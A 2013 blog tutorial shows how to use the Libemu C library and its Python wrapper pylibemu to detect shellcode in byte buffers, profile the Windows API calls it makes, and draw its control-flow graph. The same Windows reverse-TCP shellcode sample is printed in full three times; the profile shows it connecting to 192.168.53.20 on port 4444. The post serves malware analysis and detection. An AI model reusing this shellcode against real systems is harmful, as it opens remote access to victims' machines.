x86 Emulation and Shellcode Detection
=====================================
date: 06/Mar/2013
summary: Libemu is a C library for x86 emulation and shellcode detection. Pylibemu is its Python wrapper that provides an easy-to-use API and has additional features compared to the default bindings.
tags: code, reversing

## Introduction

[Libemu](http://libemu.carnivore.it/) is a C library that provides x86 architecture emulation and [shellcode](http://www.infosecwriters.com/hhworld/shellcode.txt) detection features. It uses [GetPC](http://skypher.com/wiki/index.php?title=Hacking/Shellcode/GetPC) heuristics to identify shellcode blobs within an input buffer.

> `GetPC` is a shellcode writing technique, commonly used with [selfmodifying](http://www.blackhatlibrary.net/Shellcode/Self-modifying) shellcode. Self-modification is a technique that enables a piece code to mutate itself, primarily to hide from AV/HIPS filters. A shellcode won't be loaded by a trusted loading mechanism, but would rather be injected into a target process's virtual address space. As such, during execution, it will have very limited knowledge of its execution context. Specifically, it won't be loaded at a known location and a reliable guess of its base location is unfeasible. Due to this limitation, one cannot use hardcoded `jmp`/`call` addresses in a shellcode but rather rely on some code to get the base address and then use offsets from the current base to reach specific locations inside shellcode buffer. Such a piece of code is also referred to as being [Position Independent](http://en.wikipedia.org/wiki/Position-independent_code).

## Installation and Testing

Libemu install instructions are very well documented and a quick search would provide you good references, like [this](http://blog.xanda.org/2012/05/16/installation-of-libemu-and-pylibemu-on-ubuntu/) for example. Once both Libemu and it's Python binding, [pylibemu](https://github.com/buffer/pylibemu), are installed we can have a quick validation test:

```python
#!/usr/bin/env python

import sys
import pylibemu

buf = ""
for line in sys.stdin.readlines():
  buf += line

print "[+] Testing buf of fize %dB ..." % (len(buf))

emu = pylibemu.Emulator()
offset = emu.shellcode_getpc_test(buf)

if offset >= 0:
  print "[+] IS SHELLCODE!"
else:
  print "[-] NOT SHELLCODE!"
```

Above program creates an `Emulator` instance and uses it to perform `GetPC` test upon input buffer. It can read raw input from stdin which in our case will be pipe'd through an `echo` command as such:

```
$ echo -en "\xff\xff\xff\xff" | python emutest.py
[+] Testing buf of fize 4B ...
[-] NOT SHELLCODE!
$
$ echo -en "\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38" | python emutest.py
[+] Testing buf of fize 173B ...
[+] IS SHELLCODE!
```

As is evident, the sample buffer that was used in a pylibemu usage example is indeed identified as shellcode through the `GetPC` test. Pylibemu provides another very useful API method, `test()`, that can profile shellcode bytes and identify Windows system calls, their parameters, return values, etc. This helps in understanding the behavior of identified shellcode:

```
$ echo -en "\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38" | python emuprofile.py
[+] Testing buf of fize 173B ...
[+] IS SHELLCODE!
HMODULE LoadLibraryA (
  LPCTSTR = 0x02288910 =>
    = "ws2_32";
) =  0x71a10000;
int WSAStartup (
  WORD wVersionRequested = 2;
  LPWSADATA lpWSAData = 1244272;
) =  0x0;
SOCKET WSASocket (
  int af = 2;
  int type = 1;
  int protocol = 0;
  LPWSAPROTOCOL_INFO lpProtocolInfo = 0;
  GROUP g = 0;
  DWORD dwFlags = 0;
) =  0x42;
int connect (
  SOCKET s = 66;
  struct sockaddr_in * name = 0x0012fe88 =>
    struct = {
      short sin_family = 2;
      unsigned short sin_port = 23569 (port=4444);
      struct in_addr sin_addr = {
        unsigned long s_addr = 339060928 (host=192.168.53.20);
      };
      char sin_zero = "       ";
    };
  int namelen = 16;
) =  0x0;
```

The profiling API identifies critical windows API calls above and emulates them in its x86 emulator. The return values for all system calls are recorded and dumped when requested. From the output it is evident that the shellcode under test will load the win32 socket library and then invoke socket calls to connect to host `192.168.53.20` through `4444/tcp` port. This implies that we are dealing with Windows/x86 Reverse TCP Bind shellcode.

## Extended Testing and CFG Generation

Libemu allows you to test arbitrary blob of bytes and test if it depicts shellcode-like behavior. Projects like [peepdf](http://code.google.com/p/peepdf/), [pyew](https://code.google.com/p/pyew/), and [Malzilla](https://code.google.com/p/pyew/) use Libemu for identifying, profiling and analyzing shellcode within arbitrary binary streams. Identifying shellcode in network streams is another interesting usecase and there is an [example](https://github.com/MITRECND/chopshop/blob/master/modules/shellcode_detector.py) for you to play around.

Libemu includes an interesting program, `sctest`, that can perform testing/profiling over arbitrary files. It can also generate a [CFG](http://en.wikipedia.org/wiki/Control_flow_graph) for detected shellcode and write it to a [DOT](http://en.wikipedia.org/wiki/DOT_%28graph_description_language%29) file which can then be rendered as an image:

```
$ echo -en "\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38" >shellcode.bin
$
$ sctest -Sgs 1000000 -v -G test.dot <shellcode.bin
$
$ dot shellcode.dot -Tpng -o shellcode.png
```

Here is the generated CFG image:

![image](/static/files/posts_libemu_shellcode_detection/shellcode.png.webp)
